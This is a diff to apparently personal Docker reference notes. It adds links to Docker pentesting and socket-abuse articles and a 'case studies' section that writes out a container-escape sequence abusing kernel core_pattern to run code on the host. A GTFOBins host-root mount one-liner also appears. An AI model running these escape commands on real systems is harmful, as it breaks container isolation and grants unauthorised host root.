@@ -5,6 +5,8 @@
     - [Can&\#39;t rollback service automatically after update  · Issue \#33427 · moby/moby · GitHub](https://github.com/moby/moby/issues/33427)
 - [GitHub \- rootless\-containers/rootlesskit: Linux\-native &quot;fake root&quot; for implementing rootless containers](https://github.com/rootless-containers/rootlesskit)
 
+- https://book.hacktricks.xyz/pentesting/2375-pentesting-docker
+- https://securityboulevard.com/2019/02/abusing-docker-api-socket/
 - https://gtfobins.github.io/gtfobins/docker/
     ```bash
     sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
@@ -113,6 +115,10 @@ docker run -it -v hello:/Downloads:z ubuntu bash
 ```
 DOCKER_OPTS="--userns-remap=1000:1000"
 ```
+
+### daemon socket
+
+- https://docs.docker.com/engine/security/protect-access/
 
 # monitoring
 
@@ -237,3 +243,13 @@ docker ps \
     | awk '/[0-9a-f]{12}/{print $1}' \
     | xargs -I{} docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' {}
 ```
+
+# case studies
+
+- https://kitctf.de/writeups/32c3ctf/docker
+- https://pwning.systems/posts/escaping-containers-for-fun/
+    ```sh
+    mount | grep overlay # take upperdir=...
+    echo '|/var/lib/docker/overlay2/.../diff/poc' > /proc/sys/kernel/core_pattern # poc on container's /
+    sh -c 'kill -11 $$' # trigger coredump, execs poc on host
+    ```
